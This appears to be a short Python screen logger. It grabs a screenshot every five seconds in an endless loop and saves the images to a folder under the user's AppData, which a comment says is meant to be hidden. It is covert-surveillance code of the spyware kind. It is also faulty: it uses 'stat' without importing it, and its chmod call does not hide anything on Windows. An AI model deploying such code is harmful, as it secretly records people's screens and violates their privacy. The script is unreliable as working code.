import os
import datetime
import time
from PIL import ImageGrab

# Get path
save_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'appdata\\screenshot')

# Create folder if not exit
if not os.path.exists(save_path):
    os.makedirs(save_path)
# Hiden folder
os.chmod(save_path, stat.S_IRWXU | stat.S_IRWXO | stat.S_IRWXG | stat.S_IXOTH | stat.S_IXGRP | stat.S_IXUSR | stat.S_ISVTX)
    
while True:
    now = datetime.datetime.now()
    filename = now.strftime("%Y-%m-%d_%H-%M-%S.png")
    
    # Create path file
    screenshot_filename = os.path.join(save_path, filename )

    # Screenshot and save
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_filename)
    
    # Chờ 5 giây
    time.sleep(5)
